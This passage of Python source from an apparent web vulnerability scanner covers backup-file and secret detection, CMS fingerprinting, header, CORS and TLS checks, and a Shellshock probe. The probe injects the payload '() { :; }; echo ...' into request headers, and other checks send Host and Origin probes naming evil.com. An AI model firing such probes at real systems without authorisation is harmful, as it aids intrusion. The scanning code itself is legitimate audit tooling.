            if resp and resp.status_code == 200 and not self._is_custom_404(resp, base_url, url=full_url):
                body = resp.text
                # Check for URL-rewrite false positive
                ext = ''
                if '.' in url_path.split('/')[-1]:
                    ext = '.' + url_path.split('/')[-1].rsplit('.', 1)[-1]
                if self._looks_like_rewrite(resp, ext):
                    checked += 1
                    return

                name = f"Sensitive resource: {url_path}"
                severity = "medium"
                detail = ""

                # Error detection
                err = self.detect_errors(body)
                if err:
                    name = f"Application error: {url_path}"
                    detail = truncate(err, 80)

                # Check phpinfo
                if self.detect_phpinfo(body):
                    name = f"phpinfo() found: {url_path}"

                self.add_finding(Finding(
                    name=name, severity=severity, url=full_url,
                    detail=detail, category="PostCrawl"
                ))

            checked += 1
            if checked % 50 == 0 or checked >= total:
                self.out.progress(checked, total, "PostCrawl")

        with ThreadPoolExecutor(max_workers=self.config.get("concurrency", 25)) as pool:
            futures = [pool.submit(check_postcrawl_url, u) for u in postcrawl_urls]
            for f in as_completed(futures):
                if self.stop_event.is_set():
                    break

        self.out.progress(total, total, "PostCrawl")

        # Part B: Backup file discovery
        if backup_variants:
            self.out.info(f"Checking backup file variants ({len(backup_variants)} templates)")
            # Get base files from crawled URLs
            base_files = set()
            for url in self.crawled_urls:
                parsed = urlparse(url)
                path = parsed.path
                if '.' in path.split('/')[-1]:
                    base_files.add(path)

            backup_checked = 0
            backup_total = len(base_files) * len(backup_variants)

            for file_path in base_files:
                if self.stop_event.is_set():
                    break
                parts = file_path.rsplit('/', 1)
                dir_path = parts[0] + '/' if len(parts) > 1 else '/'
                filename = parts[-1]
                name_parts = filename.rsplit('.', 1)
                file_name = name_parts[0]
                file_ext = '.' + name_parts[1] if len(name_parts) > 1 else ''

                for variant_template in backup_variants[:20]:  # Limit variants per file
                    if self.stop_event.is_set():
                        break
                    variant = variant_template.replace("${fileName}", file_name).replace("${fileExt}", file_ext)
                    backup_path = dir_path + variant
                    backup_url = safe_url_join(base_url, backup_path)

                    resp = self.http.get(backup_url, timeout=8)
                    if resp and resp.status_code == 200:
                        ct = resp.headers.get('Content-Type', '').split(';')[0].strip()
                        if ct in backup_mimes or ct in ('application/octet-stream', 'application/x-gzip', 'application/zip'):
                            if not self._is_custom_404(resp, base_url, url=backup_url):
                                # Check for URL-rewrite false positive
                                bext = ''
                                if '.' in backup_path.split('/')[-1]:
                                    bext = '.' + backup_path.split('/')[-1].rsplit('.', 1)[-1]
                                if not self._looks_like_rewrite(resp, bext):
                                    self.add_finding(Finding(
                                        name=f"Backup file found: {backup_path}",
                                        severity="medium", url=backup_url,
                                        detail=f"Content-Type: {ct}, Size: {len(resp.content)} bytes",
                                        category="PostCrawl", check_name="Backup_File"
                                    ))

                    backup_checked += 1

        # Part C: Text search on crawled pages
        self.out.info("Running text search checks on crawled pages")
        for url in list(self.crawled_urls)[:100]:
            if self.stop_event.is_set():
                break
            resp = self.http.get(url, timeout=8)
            if not resp or resp.status_code != 200:
                continue
            body = resp.text

            # Error messages
            err = self.detect_errors(body)
            if err:
                self.add_finding(Finding(
                    name="Application error message", severity="medium", url=url,
                    detail=truncate(err, 100), cwe="CWE-200",
                    tags="information_disclosure,error_handling",
                    category="PostCrawl", check_name="Error_Message"
                ))

            # Internal IP
            ip_addr = self.detect_internal_ip(body)
            if ip_addr:
                self.add_finding(Finding(
                    name="Internal IP address disclosure", severity="low", url=url,
                    detail=f"IP: {ip_addr}", cwe="CWE-200",
                    tags="information_disclosure",
                    category="PostCrawl", check_name="Internal_IP"
                ))

            # Email addresses
            emails = self.detect_email_addresses(body)
            if emails:
                unique_emails = list(set(emails))[:10]
                self.add_finding(Finding(
                    name="Email addresses found", severity="info", url=url,
                    detail=", ".join(unique_emails),
                    tags="information_disclosure",
                    category="PostCrawl", check_name="Email_Addresses"
                ))

            # Credit cards
            ccs = self.detect_credit_cards(body)
            if ccs:
                self.add_finding(Finding(
                    name="Credit card number disclosure", severity="high", url=url,
                    detail=f"Found {len(ccs)} potential card numbers",
                    cwe="CWE-200", tags="sensitive_data",
                    category="PostCrawl", check_name="Credit_Card"
                ))

            # Private keys
            pk = self.detect_private_key(body)
            if pk:
                self.add_finding(Finding(
                    name="Private key exposed", severity="critical", url=url,
                    detail=pk, cwe="CWE-321",
                    tags="sensitive_data,private_key",
                    category="PostCrawl", check_name="Private_Key"
                ))

            # Path disclosure
            unix_path = self.detect_path_disclosure_unix(body)
            if unix_path:
                self.add_finding(Finding(
                    name="Server path disclosure (Unix)", severity="low", url=url,
                    detail=unix_path, cwe="CWE-200",
                    tags="information_disclosure,path_disclosure",
                    category="PostCrawl", check_name="Path_Disclosure_Unix"
                ))

            win_path = self.detect_path_disclosure_windows(body)
            if win_path:
                self.add_finding(Finding(
                    name="Server path disclosure (Windows)", severity="low", url=url,
                    detail=win_path, cwe="CWE-200",
                    tags="information_disclosure,path_disclosure",
                    category="PostCrawl", check_name="Path_Disclosure_Windows"
                ))

            # Source code
            src = self.detect_source_code(body)
            if src:
                self.add_finding(Finding(
                    name="Source code disclosure", severity="high", url=url,
                    detail=src, cwe="CWE-540",
                    tags="information_disclosure,source_code",
                    category="PostCrawl", check_name="Source_Code"
                ))

            # Environment variables
            env = self.detect_env_variables(body)
            if env:
                self.add_finding(Finding(
                    name="Environment variables disclosure", severity="medium", url=url,
                    detail=env, cwe="CWE-200",
                    tags="information_disclosure",
                    category="PostCrawl", check_name="Env_Variables"
                ))

            # MySQL dumps
            dump = self.detect_mysql_dump(body)
            if dump:
                self.add_finding(Finding(
                    name=f"Database dump found", severity="critical", url=url,
                    detail=dump, cwe="CWE-200",
                    tags="sensitive_data,database",
                    category="PostCrawl", check_name="DB_Dump"
                ))

            # Trojan/shell
            trojan = self.detect_trojan_shell(body)
            if trojan:
                self.add_finding(Finding(
                    name="Web shell/trojan detected", severity="critical", url=url,
                    detail=f"Indicator: {trojan}",
                    tags="malware,web_shell",
                    category="PostCrawl", check_name="Web_Shell"
                ))

    # ─── Phase 5: WebApps Fingerprint ─────────────────────────────────────

    def phase_webapps(self, base_url):
        """Web application fingerprinting and version-specific checks."""
        self.out.phase("Phase 5: WebApp Fingerprinting")

        webapp_patterns = self.db.get("webapp_patterns", {})
        scripts = self.db.get("scripts", {}).get("WebApps", [])

        self.out.info(f"Checking {len(webapp_patterns)} web applications")
        checked = 0
        total = len(webapp_patterns)

        for app_name, check_paths in webapp_patterns.items():
            if self.stop_event.is_set():
                break
            checked += 1

            detected = False
            for path in check_paths[:10]:  # Limit checks per app
                if self.stop_event.is_set():
                    break
                full_url = safe_url_join(base_url, path)
                resp = self.http.get(full_url, timeout=8)

                if resp and resp.status_code == 200 and not self._is_custom_404(resp, base_url, url=full_url):
                    body = resp.text

                    # Find matching script for content verification
                    script = None
                    for s in scripts:
                        if s.get("name", "").lower().startswith(app_name.lower().split("_")[0]):
                            script = s
                            break

                    # Verify with content patterns
                    verified = False
                    if script and script.get("detection_plain"):
                        for dp in script["detection_plain"]:
                            if dp in body:
                                verified = True
                                break
                    else:
                        # Generic verification - check for meaningful content
                        if len(body) > 200:
                            # Check common CMS indicators
                            lower = body.lower()
                            cms_indicators = {
                                "wordpress": ["wp-content", "wp-includes", "wordpress"],
                                "joomla": ["joomla", "com_content", "/media/system/"],
                                "drupal": ["drupal", "sites/default", "misc/drupal.js"],
                                "magento": ["magento", "mage/", "varien/"],
                                "phpmyadmin": ["phpmyadmin", "pma_", "server_sql"],
                                "phpbb": ["phpbb", "viewtopic.php"],
                                "mediawiki": ["mediawiki", "wikitext"],
                            }
                            for cms, indicators in cms_indicators.items():
                                if cms in app_name.lower():
                                    for ind in indicators:
                                        if ind.lower() in lower:
                                            verified = True
                                            break
                                    break
                            # Also check if the path itself is specific enough
                            if not verified and any(ext in path for ext in ['.xml', '.txt', '.json', '.cfg', '.ini', '.conf']):
                                verified = True

                    if verified:
                        detected = True
                        # Look up vuln refs
                        vuln_refs = script.get("vuln_refs", []) if script else []
                        severity = "info"
                        detail = f"Detected via: {path}"
                        cve = ""

                        for vref in vuln_refs:
                            vinfo = self.db.get("vuln_db", {}).get(vref, {})
                            if vinfo and vinfo.get("severity") in ("high", "critical"):
                                severity = vinfo.get("severity", severity)
                                cve = vinfo.get("cve", "")
                                break

                        self.add_finding(Finding(
                            name=f"Web application detected: {app_name.replace('_', ' ').title()}",
                            severity=severity, url=full_url,
                            detail=detail, cve=cve,
                            tags="web_application,fingerprint",
                            category="WebApps", check_name=app_name
                        ))
                        break

            if checked % 10 == 0:
                self.out.progress(checked, total, "WebApps  ")

        self.out.progress(total, total, "WebApps  ")

    # ─── Phase 6: PostScan Security Headers ───────────────────────────────

    def phase_postscan(self, base_url):
        """Post-scan checks: security headers, SSL, misconfigurations."""
        self.out.phase("Phase 6: PostScan & Security Headers")

        resp = self.http.get(base_url)
        if not resp:
            return

        headers = resp.headers

        # ── Missing Security Headers ──
        security_headers = {
            "X-Frame-Options": ("Clickjacking: X-Frame-Options header missing", "medium", "CWE-1021"),
            "X-Content-Type-Options": ("X-Content-Type-Options header missing", "low", "CWE-16"),
            "Content-Security-Policy": ("Content-Security-Policy header missing", "medium", "CWE-16"),
            "Strict-Transport-Security": ("HSTS header missing", "low", "CWE-319"),
            "X-XSS-Protection": ("X-XSS-Protection header missing", "low", "CWE-79"),
            "Referrer-Policy": ("Referrer-Policy header missing", "info", "CWE-200"),
            "Permissions-Policy": ("Permissions-Policy header missing", "info", "CWE-16"),
        }

        for hdr, (name, severity, cwe) in security_headers.items():
            if hdr not in headers:
                self.add_finding(Finding(
                    name=name, severity=severity, url=base_url,
                    detail=f"The {hdr} HTTP header is not set",
                    cwe=cwe, tags="security_headers,misconfiguration",
                    category="PostScan", check_name=f"Missing_{hdr}"
                ))

        # ── Insecure header values ──
        xfo = headers.get("X-Frame-Options", "")
        if xfo and xfo.upper() not in ("DENY", "SAMEORIGIN"):
            self.add_finding(Finding(
                name="Weak X-Frame-Options value",
                severity="low", url=base_url,
                detail=f"Value: {xfo}",
                cwe="CWE-1021", tags="security_headers",
                category="PostScan"
            ))

        # ── Server banner ──
        server = headers.get("Server", "")
        if server and any(ver in server for ver in ['/', '.']):
            self.add_finding(Finding(
                name="Server version disclosure",
                severity="info", url=base_url,
                detail=f"Server: {server}",
                tags="information_disclosure,server_banner",
                category="PostScan", check_name="Server_Banner"
            ))

        # ── X-Powered-By ──
        xpb = headers.get("X-Powered-By", "")
        if xpb:
            self.add_finding(Finding(
                name="X-Powered-By header present",
                severity="info", url=base_url,
                detail=f"X-Powered-By: {xpb}",
                tags="information_disclosure",
                category="PostScan", check_name="X_Powered_By"
            ))

        # ── Cookie security ──
        set_cookie = headers.get("Set-Cookie", "")
        if set_cookie:
            if 'httponly' not in set_cookie.lower():
                self.add_finding(Finding(
                    name="Cookie without HttpOnly flag",
                    severity="low", url=base_url,
                    detail="Session cookie missing HttpOnly attribute",
                    cwe="CWE-1004", tags="cookies,security",
                    category="PostScan", check_name="Cookie_HttpOnly"
                ))
            if 'secure' not in set_cookie.lower() and base_url.startswith('https'):
                self.add_finding(Finding(
                    name="Cookie without Secure flag",
                    severity="low", url=base_url,
                    detail="Session cookie missing Secure attribute over HTTPS",
                    cwe="CWE-614", tags="cookies,security",
                    category="PostScan", check_name="Cookie_Secure"
                ))

        # ── HTTP Methods ──
        options_resp = self.http.options(base_url)
        if options_resp:
            allow = options_resp.headers.get("Allow", "")
            if allow:
                dangerous = [m.strip() for m in allow.split(',') if m.strip().upper() in ('PUT', 'DELETE', 'TRACE', 'CONNECT')]
                if dangerous:
                    self.add_finding(Finding(
                        name="Dangerous HTTP methods enabled",
                        severity="medium", url=base_url,
                        detail=f"Methods: {', '.join(dangerous)}",
                        cwe="CWE-749", tags="misconfiguration,http_methods",
                        category="PostScan", check_name="HTTP_Methods"
                    ))

            # TRACE method check
            if 'TRACE' in allow.upper():
                trace_resp = self.http.request('TRACE', base_url)
                if trace_resp and trace_resp.status_code == 200:
                    self.add_finding(Finding(
                        name="TRACE method enabled (XST)",
                        severity="medium", url=base_url,
                        detail="HTTP TRACE method is enabled, enabling Cross-Site Tracing attacks",
                        cwe="CWE-693", tags="xst,trace",
                        category="PostScan", check_name="TRACE_Enabled"
                    ))

        # ── CORS check ──
        cors_resp = self.http.get(base_url, headers={"Origin": "https://evil.com"})
        if cors_resp:
            acao = cors_resp.headers.get("Access-Control-Allow-Origin", "")
            if acao == "*":
                self.add_finding(Finding(
                    name="CORS misconfiguration: wildcard origin",
                    severity="medium", url=base_url,
                    detail="Access-Control-Allow-Origin: *",
                    cwe="CWE-942", tags="cors,misconfiguration",
                    category="PostScan", check_name="CORS_Wildcard"
                ))
            elif "evil.com" in acao:
                self.add_finding(Finding(
                    name="CORS misconfiguration: origin reflection",
                    severity="high", url=base_url,
                    detail=f"Access-Control-Allow-Origin reflects attacker origin: {acao}",
                    cwe="CWE-942", tags="cors,misconfiguration",
                    category="PostScan", check_name="CORS_Reflection"
                ))

        # ── Crossdomain.xml / ClientAccessPolicy.xml ──
        for policy_file in ["/crossdomain.xml", "/clientaccesspolicy.xml"]:
            resp = self.http.get(safe_url_join(base_url, policy_file), timeout=8)
            if resp and resp.status_code == 200 and ('allow-access-from' in resp.text or 'cross-domain-policy' in resp.text):
                if 'domain="*"' in resp.text:
                    self.add_finding(Finding(
                        name=f"Permissive {policy_file}",
                        severity="medium", url=safe_url_join(base_url, policy_file),
                        detail="Policy allows access from any domain",
                        tags="misconfiguration,flash",
                        category="PostScan", check_name="Cross_Domain_Policy"
                    ))

        # ── robots.txt ──
        robots_resp = self.http.get(safe_url_join(base_url, "/robots.txt"), timeout=8)
        if robots_resp and robots_resp.status_code == 200 and 'disallow' in robots_resp.text.lower():
            # Extract disallowed paths
            disallowed = re.findall(r'[Dd]isallow:\s*(.+)', robots_resp.text)
            if disallowed:
                sensitive = [d.strip() for d in disallowed if any(kw in d.lower() for kw in ['admin', 'config', 'backup', 'secret', 'private', 'internal', 'test', 'dev'])]
                if sensitive:
                    self.add_finding(Finding(
                        name="Sensitive paths in robots.txt",
                        severity="info", url=safe_url_join(base_url, "/robots.txt"),
                        detail=f"Sensitive paths: {', '.join(sensitive[:5])}",
                        tags="information_disclosure",
                        category="PostScan", check_name="Robots_Sensitive"
                    ))

        # ── .git exposure ──
        git_resp = self.http.get(safe_url_join(base_url, "/.git/config"), timeout=8)
        if git_resp and git_resp.status_code == 200 and '[core]' in git_resp.text:
            self.add_finding(Finding(
                name="Git repository exposed",
                severity="high", url=safe_url_join(base_url, "/.git/config"),
                detail="Git repository configuration is accessible",
                cwe="CWE-538", tags="information_disclosure,git",
                category="PostScan", check_name="Git_Exposed"
            ))

        # ── .env exposure ──
        env_resp = self.http.get(safe_url_join(base_url, "/.env"), timeout=8)
        if env_resp and env_resp.status_code == 200:
            if re.search(r'(DB_|APP_|SECRET|KEY|PASSWORD|TOKEN)[\w]*\s*=', env_resp.text):
                self.add_finding(Finding(
                    name=".env file exposed",
                    severity="critical", url=safe_url_join(base_url, "/.env"),
                    detail="Environment configuration file with secrets is accessible",
                    cwe="CWE-538", tags="information_disclosure,credentials",
                    category="PostScan", check_name="Env_File"
                ))

    # ─── Phase 7: Network Checks ──────────────────────────────────────────

    def phase_network(self, base_url):
        """Network-level checks: SSL/TLS, HTTP/HTTPS redirects."""
        self.out.phase("Phase 7: Network & SSL Checks")

        parsed = urlparse(base_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)

        # ── SSL/TLS checks ──
        if parsed.scheme == 'https':
            try:
                import ssl
                import socket

                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                # Get certificate info
                with socket.create_connection((host, port), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        cert = ssock.getpeercert(binary_form=False)
                        protocol = ssock.version()
                        cipher = ssock.cipher()

                        self.out.info(f"SSL/TLS: {protocol}, Cipher: {cipher[0] if cipher else 'unknown'}")

                        # Check for weak protocols
                        if protocol in ('SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1'):
                            self.add_finding(Finding(
                                name=f"Weak SSL/TLS protocol: {protocol}",
                                severity="medium", url=base_url,
                                detail=f"Server supports deprecated protocol {protocol}",
                                cwe="CWE-326", tags="ssl,tls,weak_protocol",
                                category="Network", check_name="Weak_TLS"
                            ))

                        # Check certificate
                        if cert:
                            # Expiry check
                            not_after = cert.get('notAfter', '')
                            if not_after:
                                try:
                                    from datetime import datetime as dt
                                    expiry = dt.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                                    if expiry < datetime.now():
                                        self.add_finding(Finding(
                                            name="SSL certificate expired",
                                            severity="high", url=base_url,
                                            detail=f"Expired: {not_after}",
                                            tags="ssl,certificate",
                                            category="Network", check_name="SSL_Expired"
                                        ))
                                    elif (expiry - datetime.now()).days < 30:
                                        self.add_finding(Finding(
                                            name="SSL certificate expiring soon",
                                            severity="low", url=base_url,
                                            detail=f"Expires: {not_after}",
                                            tags="ssl,certificate",
                                            category="Network", check_name="SSL_Expiring"
                                        ))
                                except Exception:
                                    pass

                # Check for weak ciphers
                weak_ciphers_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                weak_ciphers_context.check_hostname = False
                weak_ciphers_context.verify_mode = ssl.CERT_NONE
                try:
                    weak_ciphers_context.set_ciphers('RC4:DES:3DES:NULL:EXPORT')
                    with socket.create_connection((host, port), timeout=5) as sock:
                        with weak_ciphers_context.wrap_socket(sock, server_hostname=host) as ssock:
                            weak_cipher = ssock.cipher()
                            if weak_cipher:
                                self.add_finding(Finding(
                                    name=f"Weak cipher supported: {weak_cipher[0]}",
                                    severity="medium", url=base_url,
                                    detail=f"Cipher: {weak_cipher[0]}, Protocol: {weak_cipher[1]}",
                                    cwe="CWE-326", tags="ssl,weak_cipher",
                                    category="Network", check_name="Weak_Cipher"
                                ))
                except (ssl.SSLError, ConnectionError, OSError):
                    pass  # Good - weak ciphers rejected

            except Exception as e:
                self.out.info(f"SSL check error: {str(e)[:60]}")

        # ── HTTP to HTTPS redirect ──
        if parsed.scheme == 'https':
            http_url = base_url.replace('https://', 'http://', 1)
            resp = self.http.get(http_url, allow_redirects=False, timeout=8)
            if resp and resp.status_code not in (301, 302, 307, 308):
                self.add_finding(Finding(
                    name="HTTP to HTTPS redirect missing",
                    severity="low", url=http_url,
                    detail="HTTP requests are not redirected to HTTPS",
                    tags="ssl,redirect",
                    category="Network", check_name="HTTP_Redirect"
                ))

    # ─── Phase 8: Shellshock / Special Server Checks ──────────────────────

    def phase_special(self, base_url):
        """Special vulnerability checks: Shellshock, verb tampering, etc."""
        self.out.phase("Phase 8: Special Vulnerability Checks")

        # ── Shellshock (Bash RCE) ──
        shellshock_paths = [
            "/", "/cgi-bin/", "/cgi-bin/test.cgi", "/cgi-bin/admin.cgi",
            "/cgi-bin/guestbook.cgi", "/cgi-bin/search.cgi",
            "/cgi-sys/defaultwebpage.cgi", "/cgi-mod/index.cgi",
        ]
        shellshock_payload = '() { :; }; echo Content-Type: text/plain; echo; echo acunetixshellshock'
        magic = 'acunetixshellshock'

        for path in shellshock_paths:
            if self.stop_event.is_set():
                break
            url = safe_url_join(base_url, path)
            resp = self.http.get(url, headers={
                "Referer": shellshock_payload,
                "User-Agent": shellshock_payload,
            }, timeout=10)
            if resp and magic in resp.text:
                self.add_finding(Finding(
                    name="Shellshock (Bash RCE) - CVE-2014-6271",
                    severity="critical", url=url,
                    detail=f"Shellshock vulnerability found via header injection",
                    evidence=magic, cve="CVE-2014-6271", cwe="CWE-78",
                    tags="rce,shellshock,bash",
                    category="PerServer", check_name="Shellshock"
                ))
                break

        # ── HTTP Verb Tampering ──
        for verb in ['JEFF', 'CATS']:
            resp = self.http.request(verb, base_url, timeout=8)
            if resp and resp.status_code == 200:
                normal = self.http.get(base_url, timeout=8)
                if normal and normal.status_code in (401, 403):
                    self.add_finding(Finding(
                        name="HTTP verb tampering bypass",
                        severity="medium", url=base_url,
                        detail=f"Custom verb '{verb}' bypasses authentication (200 vs {normal.status_code})",
                        cwe="CWE-288", tags="authentication,bypass",
                        category="PerServer", check_name="Verb_Tampering"
                    ))
                    break

        # ── Host header injection ──
        resp = self.http.get(base_url, headers={"Host": "evil.com"}, timeout=8)
        if resp and 'evil.com' in resp.text:
            self.add_finding(Finding(
                name="Host header injection",
                severity="medium", url=base_url,
                detail="Application reflects Host header in response body",
                cwe="CWE-644", tags="host_header,injection",
                category="PerServer", check_name="Host_Header_Injection"
            ))

    # ─── 404 Detection ────────────────────────────────────────────────────

    _404_body_cache = {}
    _404_lock = threading.Lock()

    def _probe_404(self, probe_base):
        """Probe a directory for its 404 fingerprint. Returns list of sample dicts."""
        samples = []
        for suffix in [
            "nonexistent_%s.html" % hashlib.md5(os.urandom(8)).hexdigest()[:10],
            "nx_%s.txt" % hashlib.md5(os.urandom(8)).hexdigest()[:10],
        ]:
            probe_url = probe_base.rstrip('/') + '/' + suffix
            test_resp = self.http.get(probe_url, timeout=8)
            if test_resp:
                body = test_resp.text
                samples.append({
                    "status": test_resp.status_code,
                    "length": len(body),
                    "hash": hashlib.md5(body.encode()).hexdigest(),
                    "title": "",
                    "is_html": bool(re.search(r'<html|<body|<div|<head', body[:2000], re.I)),
                })
                if HAS_BS4:
                    try:
                        soup = BeautifulSoup(body, 'html.parser')
                        title = soup.find('title')
                        if title:
                            samples[-1]["title"] = title.get_text().strip().lower()
                    except Exception:
                        pass
        return samples

    def _get_404_samples(self, url):
        """Get cached 404 samples for a URL, probing both the directory and root."""
        parsed = urlparse(url)
        path = parsed.path or '/'
        # Directory of the URL
        if '/' in path:
            dir_path = path.rsplit('/', 1)[0] + '/'
        else:
            dir_path = '/'

        base = parsed.scheme + '://' + parsed.netloc
        dir_url = base + dir_path

        with self._404_lock:
            # Probe the specific directory (if not root)
            if dir_url not in self._404_body_cache:
                self._404_body_cache[dir_url] = self._probe_404(dir_url)
            # Also ensure root is probed
            root_url = base + '/'
            if root_url not in self._404_body_cache:
                self._404_body_cache[root_url] = self._probe_404(root_url)

        # Return combined samples (directory-level first, then root)
        samples = list(self._404_body_cache.get(dir_url, []))
        if dir_url != root_url:
            samples.extend(self._404_body_cache.get(root_url, []))
        return samples

    def _is_custom_404(self, resp, base_url, url=None):
        """Detect custom 404 pages with per-directory fingerprinting."""
        if resp.status_code == 404:
            return True
        if resp.status_code in (301, 302, 303, 307, 308):
            return True

        # Get 404 samples for this URL's directory (or fall back to base_url)
        lookup_url = url or resp.url if hasattr(resp, 'url') else base_url
        samples = self._get_404_samples(lookup_url)

        resp_hash = hashlib.md5(resp.text.encode()).hexdigest()
        resp_len = len(resp.text)

        for sample in samples:
            # Exact hash match
            if sample["hash"] == resp_hash:
                return True
            # Same status + similar length (within 15%)
            if sample["status"] == resp.status_code and sample["length"] > 0:
                ratio = abs(resp_len - sample["length"]) / max(sample["length"], 1)
                if ratio < 0.15:
                    return True

        # Heuristic: check for common 404 indicators in body
        body_lower = resp.text.lower()
        not_found_indicators = [
            'page not found', '404 not found', '404 error', 'file not found',
            'the page you requested was not found', 'does not exist',
            "page doesn\x27t exist", 'resource not found', 'nothing found',
            'the requested url was not found', 'error 404', 'http 404',
            'not found on this server'
        ]
        if resp_len < 8000:
            for ind in not_found_indicators:
                if ind in body_lower:
                    return True

        return False

    def _looks_like_rewrite(self, resp, expected_ext):
        """Detect URL-rewrite false positives: e.g. requesting .txt but getting HTML back."""
        if not expected_ext:
            return False
        ct = resp.headers.get('Content-Type', '').split(';')[0].strip().lower()
        body = resp.text[:2000]
        is_html = bool(re.search(r'<html|<body|<div|<head|<!doctype', body, re.I))

        # Non-HTML extensions that returned HTML content -> URL rewrite
        non_html_exts = {
            '.txt', '.log', '.cfg', '.conf', '.ini', '.bak', '.old', '.orig',
            '.sql', '.db', '.sqlite', '.csv', '.xml', '.json', '.yml', '.yaml',
            '.env', '.key', '.pem', '.crt', '.p12', '.pfx', '.jks',
            '.gz', '.tar', '.zip', '.rar', '.7z', '.war', '.jar',
            '.swp', '.swo', '.save', '.tmp', '.temp', '.dist', '.sample',
        }
        ext_lower = expected_ext.lower()
        if ext_lower in non_html_exts and (is_html or 'text/html' in ct):
            return True

        # .bak/.old of non-HTML files returning HTML
        bak_exts = {'.bak', '.old', '.orig', '.save', '.swp', '.copy', '.dist', '.tmp'}
        if ext_lower in bak_exts and is_html:
            return True

        return False

    # ─── Main Scan Orchestrator ───────────────────────────────────────────

    def scan(self, target_url):
        """Run full scan on a target."""
        base_url = normalize_url(target_url)
        self.out.info(f"Target: {base_url}")
        self.out.info(f"Concurrency: {self.config.get('concurrency', 25)}, Rate limit: {self.config.get('rate_limit', 150)} req/s")

        start_time = time.time()

        # Setup signal handler
        def signal_handler(sig, frame):
            self.out.warn("Ctrl+C detected, stopping scan...")
            self.stop_event.set()
        signal.signal(signal.SIGINT, signal_handler)

        try:
            # Technology detection
            self.detect_technology(base_url)

            # Crawl
            self.crawl(base_url,
                       max_depth=self.config.get("crawl_depth", 3),
                       max_pages=self.config.get("crawl_max_pages", 200))

            # Phase 1: PerServer
            self.phase_perserver(base_url)

            # Phase 2: PerFolder
            if not self.stop_event.is_set():
                self.phase_perfolder(base_url)

            # Phase 3: PerFile/PerScheme (injection tests)
            if not self.stop_event.is_set():
                self.phase_perfile(base_url)

            # Phase 4: PostCrawl
            if not self.stop_event.is_set():
                self.phase_postcrawl(base_url)

            # Phase 5: WebApps
            if not self.stop_event.is_set():
                self.phase_webapps(base_url)

            # Phase 6: PostScan
            if not self.stop_event.is_set():
                self.phase_postscan(base_url)

            # Phase 7: Network
            if not self.stop_event.is_set():
                self.phase_network(base_url)

            # Phase 8: Special
            if not self.stop_event.is_set():
                self.phase_special(base_url)

        except Exception as e:
            self.out.error(f"Scan error: {e}")
            if self.config.get("verbose"):
                traceback.print_exc()

        elapsed = time.time() - start_time
        self.out.summary(self.findings, elapsed, self.http.request_count, self.http.error_count)

        return self.findings

# ════════════════════# ═══════════════════════════════════════════════════════════════════════════════
#  Database Update Operations
# ═══════════════════════════════════════════════════════════════════════════════

def detect_acunetix_version():
    """
    Detect Acunetix version from local installation.
    Linux:   looks for v_XXXXXXXXX directory under install path
    Windows: looks for security_XXXXXXXXX.bin in ProgramData/Acunetix/shared/security/
    Returns version string (e.g. '250204093') or None.
    """
    best_ver = None
    best_ver_int = 0

    if IS_WINDOWS:
        # Windows: C:/ProgramData/Acunetix/shared/security/security_NNNNN.bin
        pd = os.environ.get("ProgramData", r"C:\ProgramData")
        security_dirs = [
            os.path.join(pd, "Acunetix", "shared", "security"),
            os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "Acunetix", "shared", "security"),
        ]
        if ACUNETIX_INSTALL_DIR:
            security_dirs.insert(0, os.path.join(ACUNETIX_INSTALL_DIR, "shared", "security"))

        pat = re.compile(r'^security_(\d+)\.bin$', re.IGNORECASE)
        for sec_dir in security_dirs:
            if not os.path.isdir(sec_dir):
                continue
            try:
                for entry in os.listdir(sec_dir):
                    m = pat.match(entry)
                    if m:
                        v = int(m.group(1))
                        if v > best_ver_int:
                            best_ver_int = v
                            best_ver = m.group(1)
            except PermissionError:
                continue

    # Linux / fallback: v_XXXXXXXXX dirs
    candidates = []
    if ACUNETIX_INSTALL_DIR:
        candidates.append(ACUNETIX_INSTALL_DIR)
    if not IS_WINDOWS:
        candidates.extend([
            "/home/acunetix/.acunetix",
            os.path.expanduser("~/.acunetix"),
            "/opt/acunetix",
        ])

    for base in candidates:
        if not base or not os.path.isdir(base):
            continue
        try:
            for entry in os.listdir(base):
                if entry.startswith("v_") and os.path.isdir(os.path.join(base, entry)):
                    ver_str = entry[2:]
                    if ver_str.isdigit():
                        v = int(ver_str)
                        if v > best_ver_int:
                            best_ver_int = v
                            best_ver = ver_str
        except PermissionError:
            continue

    return best_ver


def get_db_version(db_path=None):
    """
    Read the acunetix_version from an existing checks_db.json.
    Returns version string or None.
    """
    path = db_path or DEFAULT_DB_PATH
    if not os.path.isfile(path):
        return None
    try:
        with open(path, encoding='utf-8') as f:
            db = json.load(f)
        return db.get("_meta", {}).get("acunetix_version") or None
    except Exception:
        return None


def parse_version_int(ver_str):
    """Convert version string like '250204093' to integer for comparison."""
    if not ver_str:
        return 0
    try:
        return int(ver_str)
    except (ValueError, TypeError):
        return 0


def find_best_archive(search_dirs=None):
    """
    Find the highest-versioned updatedbd_VERSION.tgz in given directories.
    Returns (path, version_str) or (None, None).
    """
    if search_dirs is None:
        search_dirs = [os.getcwd(), SCRIPT_DIR]

    best_path = None
    best_ver = 0
    best_ver_str = None

    pattern = re.compile(r'^updatedbd_(\d+)\.tgz$')

    for d in search_dirs:
        if not os.path.isdir(d):
            continue
        try:
            for fname in os.listdir(d):
                m = pattern.match(fname)
                if m:
                    v = int(m.group(1))
                    if v > best_ver:
                        best_ver = v
                        best_ver_str = m.group(1)
                        best_path = os.path.join(d, fname)
        except PermissionError:
            continue

    return best_path, best_ver_str


class DatabaseUpdater:
    """Handles all vuln database update operations."""

    def __init__(self, no_color=False):
        self.no_color = no_color

    def _c(self, code, text):
        if self.no_color:
            return text
        return f"{code}{text}{C.RST}"

    def _banner(self, title):
        print()
        print(self._c(C.CYN, f"  ╔{'═'*58}╗"))
        print(self._c(C.CYN, f"  ║  {title:<56}║"))
        print(self._c(C.CYN, f"  ╚{'═'*58}╝"))
        print()

    def _ok(self, msg):
        print(f"  {self._c(C.GRN, '✓')} {msg}")

    def _info(self, msg):
        print(f"  {self._c(C.CYN, 'ℹ')} {msg}")

    def _err(self, msg):
        print(f"  {self._c(C.RED, '✗')} {msg}")

    def _warn(self, msg):
        print(f"  {self._c(C.YLW, '!')} {msg}")

